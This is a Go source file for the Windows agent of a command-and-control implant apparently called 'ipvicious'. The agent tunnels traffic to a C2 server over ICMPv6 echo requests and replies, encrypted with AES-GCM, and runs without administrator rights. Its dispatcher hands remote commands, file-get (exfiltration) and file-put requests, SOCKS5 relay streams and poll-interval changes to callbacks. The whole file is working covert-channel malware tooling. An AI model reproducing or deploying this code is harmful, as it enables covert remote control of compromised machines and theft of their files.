//go:build windows

// Package tunnel – client side (Windows agent).
//
// ClientTunnel runs a tight polling loop: every pollMs milliseconds it sends
// one ICMPv6 echo request to the C2 server carrying the next pending outbound
// frame (or a TypeNoop if nothing is queued).  The echo reply carries the next
// inbound frame from the C2 server, which is then dispatched to the
// appropriate stream or callback.
//
// All ICMPv6 payloads are fixed at protocol.PayloadSize bytes.  The agent
// never requires administrator rights; the Windows ICMP API (Icmp6SendEcho2)
// is accessible from user space.
package tunnel

import (
	"crypto/cipher"
	"fmt"
	"log"
	"net"
	"sync/atomic"
	"time"

	"ipvicious/internal/icmpv6"
	"ipvicious/internal/protocol"
)

// ClientTunnel manages the agent-side of the ICMPv6 tunnel.
type ClientTunnel struct {
	sender    *icmpv6.Sender
	c2        net.IP
	pollMs    uint32
	streams   *StreamTable
	sendQueue chan *protocol.Frame // frames waiting to go to C2
	seqCtr    uint32               // atomic sequence counter
	setPollCh chan uint32          // receives new poll-interval values from dispatch
	aead      cipher.AEAD          // nil = no encryption; set via SetPSK

	// Callbacks invoked in separate goroutines when the C2 sends control frames.
	// Set these before calling Run.
	OnStreamOpen func(streamID uint32, addrType byte, addr []byte, port uint16)
	OnCmd        func(streamID uint32, seqNo uint32, cmd string)
	OnFileGet    func(streamID uint32, seqNo uint32, path string)
	OnFilePut    func(streamID uint32, seqNo uint32, data []byte)
	// OnFileData is called for each TypeFileData / TypeFileEnd frame received
	// from the C2 during a file download (put command). last=true on TypeFileEnd.
	OnFileData func(streamID uint32, seqNo uint32, data []byte, last bool)
}

// NewClientTunnel creates a ClientTunnel targeting c2 (IPv6 address of the
// C2 server) with a poll interval of pollMs milliseconds.
func NewClientTunnel(c2 net.IP, pollMs uint32) (*ClientTunnel, error) {
	sender, err := icmpv6.NewSender()
	if err != nil {
		return nil, fmt.Errorf("open icmp sender: %w", err)
	}
	return &ClientTunnel{
		sender:    sender,
		c2:        c2,
		pollMs:    pollMs,
		streams:   NewStreamTable(),
		sendQueue: make(chan *protocol.Frame, 512),
		setPollCh: make(chan uint32, 1),
	}, nil
}

// Close releases the ICMP handle. Call after Run returns.
func (t *ClientTunnel) Close() {
	t.sender.Close()
}

// SetPSK configures AES-256-GCM authenticated encryption for all tunnel
// frames using the given pre-shared key.  Must be called before Run.
// An empty psk disables encryption.
func (t *ClientTunnel) SetPSK(psk string) error {
	if psk == "" {
		t.aead = nil
		return nil
	}
	aead, err := protocol.NewAEAD(psk)
	if err != nil {
		return fmt.Errorf("tunnel SetPSK: %w", err)
	}
	t.aead = aead
	return nil
}

// Streams returns the stream table (for use by the agent layer).
func (t *ClientTunnel) Streams() *StreamTable {
	return t.streams
}

// Enqueue adds a frame to the outbound send queue.
// If the queue is full the oldest frame is dropped to prevent memory growth.
func (t *ClientTunnel) Enqueue(f *protocol.Frame) {
	select {
	case t.sendQueue <- f:
	default:
		// Discard oldest, then enqueue (ring-buffer behaviour).
		select {
		case <-t.sendQueue:
		default:
		}
		t.sendQueue <- f
	}
}

// Run starts the polling loop. It blocks until stop is closed (or receives a
// value).  Typical usage: go tunnel.Run(stopCh) or run synchronously.
func (t *ClientTunnel) Run(stop <-chan struct{}) {
	// Register with the C2 server immediately
	t.enqueueCtrl(protocol.TypeHello, 0, nil)

	ticker := time.NewTicker(time.Duration(t.pollMs) * time.Millisecond)
	defer ticker.Stop()

	for {
		select {
		case <-stop:
			return
		case newMs := <-t.setPollCh:
			// Apply new poll interval atomically: stop old ticker, start a new one.
			ticker.Stop()
			atomic.StoreUint32(&t.pollMs, newMs)
			ticker = time.NewTicker(time.Duration(newMs) * time.Millisecond)
			log.Printf("[tunnel] poll interval changed to %d ms", newMs)
		case <-ticker.C:
			t.poll()
		}
	}
}

// ─── internal ─────────────────────────────────────────────────────────────────

// nextSeq atomically increments and returns the sequence counter.
func (t *ClientTunnel) nextSeq() uint32 {
	return atomic.AddUint32(&t.seqCtr, 1)
}

// enqueueCtrl builds and enqueues a control frame (streamID=0 or specific).
func (t *ClientTunnel) enqueueCtrl(typ byte, streamID uint32, data []byte) {
	t.Enqueue(&protocol.Frame{
		Type:     typ,
		StreamID: streamID,
		SeqNo:    t.nextSeq(),
		Data:     data,
	})
}

// poll performs one echo request / echo reply exchange with the C2 server.
// It picks the front of the send queue (or sends a Noop), then processes
// the inbound frame returned in the reply.
func (t *ClientTunnel) poll() {
	// Dequeue one outbound frame (non-blocking)
	var out *protocol.Frame
	select {
	case out = <-t.sendQueue:
	default:
		out = &protocol.Frame{
			Type:  protocol.TypeNoop,
			SeqNo: t.nextSeq(),
		}
	}

	payload, err := protocol.Encode(out, t.aead)
	if err != nil {
		log.Printf("[tunnel] encode error: %v", err)
		return
	}

	// Synchronous send + receive (2 s timeout)
	replyPayload, err := t.sender.SendRecv(nil, t.c2, payload, 2000)
	if err != nil {
		// Transient network error; the next poll will retry any un-acked data.
		log.Printf("[tunnel] poll error: %v", err)
		return
	}

	in, err := protocol.Decode(replyPayload, t.aead)
	if err != nil {
		// Not one of our frames (e.g. genuine ICMP reply from wrong host)
		return
	}

	t.dispatch(in)
}

// dispatch routes an incoming frame from the C2 server.
func (t *ClientTunnel) dispatch(f *protocol.Frame) {
	switch f.Type {
	case protocol.TypeNoop, protocol.TypeAck:
		// No action required.

	case protocol.TypeData:
		// Forward raw bytes to the appropriate SOCKS5 relay stream.
		if s := t.streams.Get(f.StreamID); s != nil && !s.IsClosed() {
			select {
			case s.RecvBuf <- f.Data:
			default:
				log.Printf("[tunnel] stream %d recv buffer full, dropping %d bytes",
					f.StreamID, len(f.Data))
			}
		}

	case protocol.TypeStreamOpen:
		addrType, addr, port, err := protocol.DecodeStreamOpen(f.Data)
		if err != nil {
			log.Printf("[tunnel] bad StreamOpen payload: %v", err)
			return
		}
		// Pre-register the stream so the agent knows it exists.
		t.streams.AllocWithID(f.StreamID)
		if t.OnStreamOpen != nil {
			go t.OnStreamOpen(f.StreamID, addrType, addr, port)
		}

	case protocol.TypeStreamClose:
		if s := t.streams.Get(f.StreamID); s != nil {
			s.Close()
			t.streams.Remove(f.StreamID)
		}

	case protocol.TypeCmd:
		if t.OnCmd != nil {
			go t.OnCmd(f.StreamID, f.SeqNo, string(f.Data))
		}

	case protocol.TypeFileGet:
		if t.OnFileGet != nil {
			go t.OnFileGet(f.StreamID, f.SeqNo, string(f.Data))
		}

	case protocol.TypeFilePut:
		if t.OnFilePut != nil {
			go t.OnFilePut(f.StreamID, f.SeqNo, f.Data)
		}

	case protocol.TypeFileData:
		if t.OnFileData != nil {
			go t.OnFileData(f.StreamID, f.SeqNo, f.Data, false)
		}

	case protocol.TypeFileEnd:
		if t.OnFileData != nil {
			go t.OnFileData(f.StreamID, f.SeqNo, nil, true)
		}

	case protocol.TypeSetPoll:
		// Decode the new interval and send it to the Run loop via a non-blocking
		// channel send (buffered 1). If the channel is already full with a
		// pending update, replace it with the newest value.
		newMs, err := protocol.DecodeSetPoll(f.Data)
		if err != nil {
			log.Printf("[tunnel] bad SetPoll payload: %v", err)
			return
		}
		if newMs < 10 {
			newMs = 10 // hard minimum: 10 ms
		}
		select {
		case t.setPollCh <- newMs:
		default:
			// Drain old pending value and replace with latest
			<-t.setPollCh
			t.setPollCh <- newMs
		}
	}
}
